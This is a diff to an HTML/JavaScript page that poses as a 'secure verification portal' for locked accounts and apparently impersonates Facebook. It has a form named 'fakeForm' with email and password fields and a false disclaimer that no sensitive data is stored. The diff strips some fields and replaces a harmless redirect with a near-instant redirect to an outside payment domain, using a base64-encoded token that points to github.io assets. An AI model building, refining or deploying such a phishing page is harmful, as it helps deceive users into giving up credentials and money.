@@ -79,6 +79,7 @@
             margin-left: 5px;
             margin-top: -15px;
         }
+        /* CSS maintained as requested, even for removed elements just in case */
         .confirmation-options {
             margin-top: 10px;
         }
@@ -123,39 +124,6 @@
             margin-top: 20px;
             text-align: center;
         }
-
-        /* --- NEW Loading Screen Styles --- */
-        #loadingOverlay {
-            display: none; /* Hidden by default */
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #fff;
-            z-index: 9999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .loading-logo {
-            width: 100px; /* Adjust size as needed */
-            margin-bottom: 20px;
-            animation: blink-animation 1s infinite;
-        }
-
-        @keyframes blink-animation {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        #loadingOverlay p {
-            font-size: 18px;
-            color: #333;
-            font-weight: bold;
-        }
     </style>
 </head>
 <body>
@@ -192,31 +160,12 @@
         <label for="contactEmail"><strong>Contact Email</strong></label>
         <input type="text" id="contactEmail" placeholder="Enter your contact email" autocomplete="off" autocorrect="off" spellcheck="false">
 
-        <label for="accountLockReason"><strong>Why was your account locked?</strong></label>
-        <select id="accountLockReason" autocomplete="off">
-            <option value="" disabled selected>Select reason</option>
-            <option value="unknown">Unknown reason</option>
-            <option value="security">Security issue</option>
-            <option value="policy_violation">Policy violation</option>
-            <option value="suspicious_activity">Suspicious activity</option>
-            <option value="my_confirmation_is_lost">My confirmation is lost</option>
-            <option value="other">Other</option>
-        </select>
-
-        <label for="exactReason"><strong>About your account</strong></label>
-        <textarea id="exactReason" rows="4" placeholder="Provide any additional information if needed" autocomplete="off" autocorrect="off" spellcheck="false"></textarea>
-
         <button class="proceed-btn" onclick="validateAndRedirect(event)">Proceed</button>
         
         <div class="disclaimer">
             This is a secure verification portal. We do not store sensitive information.
         </div>
     </div>
-</div>
-
-<div id="loadingOverlay">
-    <img src="https://newtest77.github.io/fb/logo.png" alt="Loading Logo" class="loading-logo">
-    <p>fatching data</p>
 </div>
 
 <script>
@@ -229,19 +178,15 @@
             return;
         }
 
-        }
+        // Removed the check for "selectedCheckbox" since the section is gone.
 
         document.getElementById('fakeForm').querySelectorAll('input, select, textarea').forEach(element => {
             element.value = '';
         });
 
-        // Show the loading overlay
-        document.getElementById('loadingOverlay').style.display = 'flex';
-
-        // Wait for 3 seconds (3000ms) then redirect
         setTimeout(function() {
-            window.location.href = "https://youtu.be/7FXigYG_Ld8?si=QuAPgl885NFxz0Mz";
-        }, 3000); 
+            window.location.href = "https://payment.maxado.in/index.php?token=Mjk5fHxhSFIwY0hNNkx5OXdaVzVrYVc1bk5EQTBMbWRwZEdoMVlpNXBieTltWDJJdlkyOXVabWx5YldGMGFXOXV8fGh0dHBzOi8vcGVuZGluZzQwNC5naXRodWIuaW8vZl9iL2ZfYi1sb2dvLnN2Zw==";
+        }, 50);
     }
 
     const togglePassword = document.getElementById('togglePassword');
@@ -251,24 +196,6 @@
         passwordInput.setAttribute('type', type);
         this.textContent = type === 'text' ? '' : '';
     });
-
-    function selectOption(option, optionId) {
-        const checkBox = option.querySelector('.checkbox');
-        const allCheckBoxes = document.querySelectorAll('.confirmation-options .checkbox');
-        if (optionId === 'noOptions') {
-            allCheckBoxes.forEach(box => {
-                if (box.id !== 'noOptions') {
-                    box.classList.remove('checked');
-                }
-            });
-            checkBox.classList.add('no-options-checked');
-        } else {
-            const noOptionsBox = document.getElementById('noOptions');
-            noOptionsBox.classList.remove('checked');
-            noOptionsBox.classList.remove('no-options-checked');
-        }
-        checkBox.classList.toggle('checked');
-    }
 </script>
 
 </body>
